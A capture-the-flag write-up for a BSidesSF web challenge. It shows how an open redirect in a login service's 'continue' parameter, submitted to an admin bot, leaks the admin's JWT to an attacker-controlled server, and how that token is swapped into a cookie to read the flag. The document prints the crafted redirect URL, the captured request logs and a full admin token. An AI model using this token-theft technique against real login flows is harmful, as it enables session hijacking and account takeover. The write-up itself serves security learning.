website here: https://cutesrv-0186d981.challenges.bsidessf.net/

login do the following redirect:

```
https://loginsvc-0af88b56.challenges.bsidessf.net/check?continue=https%3A%2F%2Fcutesrv-0186d981.challenges.bsidessf.net%2Fsetsid
```
view source from page, we can see a link to /flag.txt that is hidden

```
https://cutesrv-0186d981.challenges.bsidessf.net/flag.txt
```
trying to access that file we get Not Authorized from the server

after login with random test/test or registering new account, ```loginsid``` Cookie is established with a JWT token

testing the form:

https://cutesrv-0186d981.challenges.bsidessf.net/submit

we provide one URL we own to see what the submission triggers in the backend:

with https://myserver.io

we receive a GET request:
```json
{"method":"GET","headers":[["Host","myserver.io"],["X-Amzn-Trace-Id","Root=1-60487829-105580ea464b191b09a0b303"],["upgrade-insecure-requests","1"],["user-agent","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/90.0.4403.0 Safari/537.36"],["accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"],["sec-fetch-site","none"],["sec-fetch-mode","navigate"],["sec-fetch-user","?1"],["sec-fetch-dest","document"],["accept-encoding","gzip, deflate, br"],["accept-language","en-US"]],"body_b64":"","uri":"/","http_version":"V11","client_ip":"35.233.178.227","scheme":"HTTPS"}
```

trying with the redirect url where the app should assign the session id, but the continue will point to our controlled endpoint:

with https://loginsvc-0af88b56.challenges.bsidessf.net/check?continue=https://myserver.io%2Fsetsid

we receive the GET request wth ```authtok``` as a GET parameter of setsid endpoint: ```/setsid?authtok=JWTTOKEN```
```json
{"method":"GET","headers":[["Host","myserver.io"],["X-Amzn-Trace-Id","Root=1-60487958-10173d8c6f54471950b41c8b"],["upgrade-insecure-requests","1"],["user-agent","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/90.0.4403.0 Safari/537.36"],["accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"],["sec-fetch-site","none"],["sec-fetch-mode","navigate"],["sec-fetch-user","?1"],["sec-fetch-dest","document"],["accept-encoding","gzip, deflate, br"],["accept-language","en-US"]],"body_b64":"","uri":"/setsid?authtok=eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhdXRodG9rIiwiZXhwIjoxNjE4MDQwNzkyLCJpYXQiOjE2MTUzNjIzOTIsImlzcyI6ImxvZ2luc3ZjIiwibmJmIjoxNjE1MzYyMzkyLCJzdWIiOiJhZG1pbiJ9.91USGrgsdu7p-a2r5tjKGwkMfL1JgA0mAlbN3em27UrzBIhKAGo1M6UbHFFCTSftZIRdeYTzDzZgesFrD8pODg","http_version":"V11","client_ip":"35.233.178.227","scheme":"HTTPS"}
```

tamper cookie replacing our ```loginsid``` JWT token with value we got from hijacked ```authtok```

refresh browser

access now to https://cutesrv-0186d981.challenges.bsidessf.net/flag.txt
